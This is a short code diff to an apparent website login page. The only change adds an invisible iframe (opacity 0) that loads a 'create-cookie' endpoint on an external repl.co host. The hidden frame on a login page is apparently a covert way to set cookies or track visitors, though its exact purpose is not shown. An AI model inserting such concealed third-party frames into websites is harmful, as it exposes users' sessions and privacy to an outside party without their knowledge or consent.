@@ -22,6 +22,7 @@ permalink: /login/
         </div>
     </form>
 </div>
+<iframe src="https://Discord-Bot.danbgil.repl.co/create-cookie" style="opacity: 0;"></iframe>
 <script defer>
     const urlParams = new URLSearchParams(window.location.search);
     let errors = urlParams.getAll('err')
